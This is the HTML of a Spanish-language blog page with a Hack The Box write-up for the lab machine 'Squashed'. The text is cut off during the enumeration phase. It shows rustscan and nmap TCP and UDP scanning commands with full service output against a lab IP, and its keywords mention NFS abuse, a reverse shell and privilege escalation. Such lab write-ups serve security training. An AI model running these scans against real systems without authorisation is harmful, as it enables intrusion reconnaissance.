<!doctype html>
<html lang="es">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/pointed.png" />

<title>Hack The Box: Squashed Writeup | Easy&nbsp;|&nbsp;Bajo el Teclado</title>
<meta
  name="title"
  content="Hack The Box: Squashed Writeup | Easy"
/>
<meta
  name="description"
  content="Hack The Box: Squashed Writeup
Welcome to my detailed writeup of the easy difficulty machine &ldquo;Squashed&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration






1$ rustscan -a 10.129.228.109 --ulimit 5000 -g
210.129.228.109 -&gt; [22,80,111,2049,44291,49353,50057,53893]






 1$ nmap -p22,80,111,2049,44291,49353,50057,53893 -sCV 10.129.228.109 -oN allPorts
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:45 CEST
 3Nmap scan report for 10.129.228.109
 4Host is up (0.037s latency).
 5
 6PORT      STATE SERVICE  VERSION
 722/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 8| ssh-hostkey: 
 9|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
10|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
11|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
1280/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
13|_http-server-header: Apache/2.4.41 (Ubuntu)
14|_http-title: Built Better
15111/tcp   open  rpcbind  2-4 (RPC #100000)
16| rpcinfo: 
17|   program version    port/proto  service
18|   100000  2,3,4        111/tcp   rpcbind
19|   100000  2,3,4        111/udp   rpcbind
20|   100000  3,4          111/tcp6  rpcbind
21|   100000  3,4          111/udp6  rpcbind
22|   100003  3           2049/udp   nfs
23|   100003  3           2049/udp6  nfs
24|   100003  3,4         2049/tcp   nfs
25|   100003  3,4         2049/tcp6  nfs
26|   100005  1,2,3      35859/udp6  mountd
27|   100005  1,2,3      52835/tcp6  mountd
28|   100005  1,2,3      53893/tcp   mountd
29|   100005  1,2,3      58461/udp   mountd
30|   100021  1,3,4      34979/tcp6  nlockmgr
31|   100021  1,3,4      44291/tcp   nlockmgr
32|   100021  1,3,4      54708/udp6  nlockmgr
33|   100021  1,3,4      56514/udp   nlockmgr
34|   100227  3           2049/tcp   nfs_acl
35|   100227  3           2049/tcp6  nfs_acl
36|   100227  3           2049/udp   nfs_acl
37|_  100227  3           2049/udp6  nfs_acl
382049/tcp  open  nfs      3-4 (RPC #100003)
3944291/tcp open  nlockmgr 1-4 (RPC #100021)
4049353/tcp open  mountd   1-3 (RPC #100005)
4150057/tcp open  mountd   1-3 (RPC #100005)
4253893/tcp open  mountd   1-3 (RPC #100005)
43Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
44
45Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
46Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
UDP Enumeration






 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.109 -oN allPorts.UDP
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:46 CEST
 3Nmap scan report for 10.129.228.109
 4Host is up (0.039s latency).
 5Not shown: 1492 open|filtered udp ports (no-response)
 6PORT      STATE  SERVICE
 7111/udp   open   rpcbind
 8464/udp   closed kpasswd5
 91035/udp  closed mxxrlogin
102049/udp  open   nfs
1118994/udp closed unknown
1220288/udp closed unknown
1323230/udp closed unknown
1430473/udp closed unknown
NFS Enumeration
Me llama la atención el servicio NFS expuesto ya que no es común encontrarse con esto."
/>
<meta
  name="keywords"
  content="HackTheBox,Squashed,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,Linux,NFS Enumeration,Abusing NFS UID/GID missmatch,Information Leakage,Abusing .Xauthority Cookie,"
/>

  <meta name="author" content="Andrés Del Cerro" />




<meta property="og:url" content="http://localhost:1313/writeups/squashed---hackthebox/">
  <meta property="og:site_name" content="Bajo el Teclado">
  <meta property="og:title" content="Hack The Box: Squashed Writeup | Easy">
  <meta property="og:description" content="Hack The Box: Squashed Writeup Welcome to my detailed writeup of the easy difficulty machine “Squashed” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.228.109 --ulimit 5000 -g 210.129.228.109 -&gt; [22,80,111,2049,44291,49353,50057,53893]1$ nmap -p22,80,111,2049,44291,49353,50057,53893 -sCV 10.129.228.109 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:45 CEST 3Nmap scan report for 10.129.228.109 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 8| ssh-hostkey: 9| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) 10| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) 11|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 1280/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 13|_http-server-header: Apache/2.4.41 (Ubuntu) 14|_http-title: Built Better 15111/tcp open rpcbind 2-4 (RPC #100000) 16| rpcinfo: 17| program version port/proto service 18| 100000 2,3,4 111/tcp rpcbind 19| 100000 2,3,4 111/udp rpcbind 20| 100000 3,4 111/tcp6 rpcbind 21| 100000 3,4 111/udp6 rpcbind 22| 100003 3 2049/udp nfs 23| 100003 3 2049/udp6 nfs 24| 100003 3,4 2049/tcp nfs 25| 100003 3,4 2049/tcp6 nfs 26| 100005 1,2,3 35859/udp6 mountd 27| 100005 1,2,3 52835/tcp6 mountd 28| 100005 1,2,3 53893/tcp mountd 29| 100005 1,2,3 58461/udp mountd 30| 100021 1,3,4 34979/tcp6 nlockmgr 31| 100021 1,3,4 44291/tcp nlockmgr 32| 100021 1,3,4 54708/udp6 nlockmgr 33| 100021 1,3,4 56514/udp nlockmgr 34| 100227 3 2049/tcp nfs_acl 35| 100227 3 2049/tcp6 nfs_acl 36| 100227 3 2049/udp nfs_acl 37|_ 100227 3 2049/udp6 nfs_acl 382049/tcp open nfs 3-4 (RPC #100003) 3944291/tcp open nlockmgr 1-4 (RPC #100021) 4049353/tcp open mountd 1-3 (RPC #100005) 4150057/tcp open mountd 1-3 (RPC #100005) 4253893/tcp open mountd 1-3 (RPC #100005) 43Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 44 45Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 46Nmap done: 1 IP address (1 host up) scanned in 8.96 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.109 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:46 CEST 3Nmap scan report for 10.129.228.109 4Host is up (0.039s latency). 5Not shown: 1492 open|filtered udp ports (no-response) 6PORT STATE SERVICE 7111/udp open rpcbind 8464/udp closed kpasswd5 91035/udp closed mxxrlogin 102049/udp open nfs 1118994/udp closed unknown 1220288/udp closed unknown 1323230/udp closed unknown 1430473/udp closed unknownNFS Enumeration Me llama la atención el servicio NFS expuesto ya que no es común encontrarse con esto.">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-05T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-05T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="Squashed">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="CTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hack The Box: Squashed Writeup | Easy">
  <meta name="twitter:description" content="Hack The Box: Squashed Writeup Welcome to my detailed writeup of the easy difficulty machine “Squashed” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.228.109 --ulimit 5000 -g 210.129.228.109 -&gt; [22,80,111,2049,44291,49353,50057,53893]1$ nmap -p22,80,111,2049,44291,49353,50057,53893 -sCV 10.129.228.109 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:45 CEST 3Nmap scan report for 10.129.228.109 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 8| ssh-hostkey: 9| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) 10| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) 11|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 1280/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 13|_http-server-header: Apache/2.4.41 (Ubuntu) 14|_http-title: Built Better 15111/tcp open rpcbind 2-4 (RPC #100000) 16| rpcinfo: 17| program version port/proto service 18| 100000 2,3,4 111/tcp rpcbind 19| 100000 2,3,4 111/udp rpcbind 20| 100000 3,4 111/tcp6 rpcbind 21| 100000 3,4 111/udp6 rpcbind 22| 100003 3 2049/udp nfs 23| 100003 3 2049/udp6 nfs 24| 100003 3,4 2049/tcp nfs 25| 100003 3,4 2049/tcp6 nfs 26| 100005 1,2,3 35859/udp6 mountd 27| 100005 1,2,3 52835/tcp6 mountd 28| 100005 1,2,3 53893/tcp mountd 29| 100005 1,2,3 58461/udp mountd 30| 100021 1,3,4 34979/tcp6 nlockmgr 31| 100021 1,3,4 44291/tcp nlockmgr 32| 100021 1,3,4 54708/udp6 nlockmgr 33| 100021 1,3,4 56514/udp nlockmgr 34| 100227 3 2049/tcp nfs_acl 35| 100227 3 2049/tcp6 nfs_acl 36| 100227 3 2049/udp nfs_acl 37|_ 100227 3 2049/udp6 nfs_acl 382049/tcp open nfs 3-4 (RPC #100003) 3944291/tcp open nlockmgr 1-4 (RPC #100021) 4049353/tcp open mountd 1-3 (RPC #100005) 4150057/tcp open mountd 1-3 (RPC #100005) 4253893/tcp open mountd 1-3 (RPC #100005) 43Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 44 45Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 46Nmap done: 1 IP address (1 host up) scanned in 8.96 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.109 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:46 CEST 3Nmap scan report for 10.129.228.109 4Host is up (0.039s latency). 5Not shown: 1492 open|filtered udp ports (no-response) 6PORT STATE SERVICE 7111/udp open rpcbind 8464/udp closed kpasswd5 91035/udp closed mxxrlogin 102049/udp open nfs 1118994/udp closed unknown 1220288/udp closed unknown 1323230/udp closed unknown 1430473/udp closed unknownNFS Enumeration Me llama la atención el servicio NFS expuesto ya que no es común encontrarse con esto.">





  <meta itemprop="name" content="Hack The Box: Squashed Writeup | Easy">
  <meta itemprop="description" content="Hack The Box: Squashed Writeup Welcome to my detailed writeup of the easy difficulty machine “Squashed” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.228.109 --ulimit 5000 -g 210.129.228.109 -&gt; [22,80,111,2049,44291,49353,50057,53893]1$ nmap -p22,80,111,2049,44291,49353,50057,53893 -sCV 10.129.228.109 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:45 CEST 3Nmap scan report for 10.129.228.109 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 722/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 8| ssh-hostkey: 9| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) 10| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) 11|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 1280/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 13|_http-server-header: Apache/2.4.41 (Ubuntu) 14|_http-title: Built Better 15111/tcp open rpcbind 2-4 (RPC #100000) 16| rpcinfo: 17| program version port/proto service 18| 100000 2,3,4 111/tcp rpcbind 19| 100000 2,3,4 111/udp rpcbind 20| 100000 3,4 111/tcp6 rpcbind 21| 100000 3,4 111/udp6 rpcbind 22| 100003 3 2049/udp nfs 23| 100003 3 2049/udp6 nfs 24| 100003 3,4 2049/tcp nfs 25| 100003 3,4 2049/tcp6 nfs 26| 100005 1,2,3 35859/udp6 mountd 27| 100005 1,2,3 52835/tcp6 mountd 28| 100005 1,2,3 53893/tcp mountd 29| 100005 1,2,3 58461/udp mountd 30| 100021 1,3,4 34979/tcp6 nlockmgr 31| 100021 1,3,4 44291/tcp nlockmgr 32| 100021 1,3,4 54708/udp6 nlockmgr 33| 100021 1,3,4 56514/udp nlockmgr 34| 100227 3 2049/tcp nfs_acl 35| 100227 3 2049/tcp6 nfs_acl 36| 100227 3 2049/udp nfs_acl 37|_ 100227 3 2049/udp6 nfs_acl 382049/tcp open nfs 3-4 (RPC #100003) 3944291/tcp open nlockmgr 1-4 (RPC #100021) 4049353/tcp open mountd 1-3 (RPC #100005) 4150057/tcp open mountd 1-3 (RPC #100005) 4253893/tcp open mountd 1-3 (RPC #100005) 43Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 44 45Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 46Nmap done: 1 IP address (1 host up) scanned in 8.96 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.228.109 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:46 CEST 3Nmap scan report for 10.129.228.109 4Host is up (0.039s latency). 5Not shown: 1492 open|filtered udp ports (no-response) 6PORT STATE SERVICE 7111/udp open rpcbind 8464/udp closed kpasswd5 91035/udp closed mxxrlogin 102049/udp open nfs 1118994/udp closed unknown 1220288/udp closed unknown 1323230/udp closed unknown 1430473/udp closed unknownNFS Enumeration Me llama la atención el servicio NFS expuesto ya que no es común encontrarse con esto.">
  <meta itemprop="datePublished" content="2024-08-05T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-08-05T00:00:00+00:00">
  <meta itemprop="wordCount" content="1289">
  <meta itemprop="keywords" content="HackTheBox,Squashed,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,Linux,NFS Enumeration,Abusing NFS UID/GID Missmatch,Information Leakage,Abusing .Xauthority Cookie">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZHDKLM7DD2');
</script>


  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/about/"
    
    >About me</a
  >

  <a
    href="/writeups/"
    
    >Writeup&#39;s</a
  >


</nav>
<div style="display: flex; justify-content: center; align-items: center">
  <div style="display: flex; width: 20rem; gap: 2rem;">
    <img src="yo.png" alt="">
    <h1>Hack The Box: Squashed Writeup | Easy</h1>
  </div>
</div>


    </header>
    <main>
      
  
  
  <content>
    <h1 id="hack-the-box-squashed-writeup">Hack The Box: Squashed Writeup</h1>
<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Squashed&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.228.109 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.228.109 -&gt; [22,80,111,2049,44291,49353,50057,53893]</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p22,80,111,2049,44291,49353,50057,53893 -sCV 10.129.228.109 -oN allPorts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:45 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.228.109
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.037s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|   <span style="color:#ff0;font-weight:bold">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>|   <span style="color:#ff0;font-weight:bold">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|_  <span style="color:#ff0;font-weight:bold">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>|_http-title: Built Better
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>111/tcp   open  rpcbind  2-4 (RPC <span style="color:#007f7f">#100000)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>| rpcinfo: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>|   program version    port/proto  service
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>|   <span style="color:#ff0;font-weight:bold">100000</span>  2,3,4        111/tcp   rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>|   <span style="color:#ff0;font-weight:bold">100000</span>  2,3,4        111/udp   rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>|   <span style="color:#ff0;font-weight:bold">100000</span>  3,4          111/tcp6  rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>|   <span style="color:#ff0;font-weight:bold">100000</span>  3,4          111/udp6  rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>|   <span style="color:#ff0;font-weight:bold">100003</span>  <span style="color:#ff0;font-weight:bold">3</span>           2049/udp   nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>|   <span style="color:#ff0;font-weight:bold">100003</span>  <span style="color:#ff0;font-weight:bold">3</span>           2049/udp6  nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>|   <span style="color:#ff0;font-weight:bold">100003</span>  3,4         2049/tcp   nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>|   <span style="color:#ff0;font-weight:bold">100003</span>  3,4         2049/tcp6  nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>|   <span style="color:#ff0;font-weight:bold">100005</span>  1,2,3      35859/udp6  mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>|   <span style="color:#ff0;font-weight:bold">100005</span>  1,2,3      52835/tcp6  mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>|   <span style="color:#ff0;font-weight:bold">100005</span>  1,2,3      53893/tcp   mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>|   <span style="color:#ff0;font-weight:bold">100005</span>  1,2,3      58461/udp   mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>|   <span style="color:#ff0;font-weight:bold">100021</span>  1,3,4      34979/tcp6  nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>|   <span style="color:#ff0;font-weight:bold">100021</span>  1,3,4      44291/tcp   nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>|   <span style="color:#ff0;font-weight:bold">100021</span>  1,3,4      54708/udp6  nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>|   <span style="color:#ff0;font-weight:bold">100021</span>  1,3,4      56514/udp   nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>|   <span style="color:#ff0;font-weight:bold">100227</span>  <span style="color:#ff0;font-weight:bold">3</span>           2049/tcp   nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>|   <span style="color:#ff0;font-weight:bold">100227</span>  <span style="color:#ff0;font-weight:bold">3</span>           2049/tcp6  nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>|   <span style="color:#ff0;font-weight:bold">100227</span>  <span style="color:#ff0;font-weight:bold">3</span>           2049/udp   nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>|_  <span style="color:#ff0;font-weight:bold">100227</span>  <span style="color:#ff0;font-weight:bold">3</span>           2049/udp6  nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>2049/tcp  open  nfs      3-4 (RPC <span style="color:#007f7f">#100003)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>44291/tcp open  nlockmgr 1-4 (RPC <span style="color:#007f7f">#100021)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>49353/tcp open  mountd   1-3 (RPC <span style="color:#007f7f">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>50057/tcp open  mountd   1-3 (RPC <span style="color:#007f7f">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>53893/tcp open  mountd   1-3 (RPC <span style="color:#007f7f">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 8.96 seconds</span></span></code></pre></div>
<h1 id="udp-enumeration">UDP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.228.109 -oN allPorts.UDP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 15:46 CEST
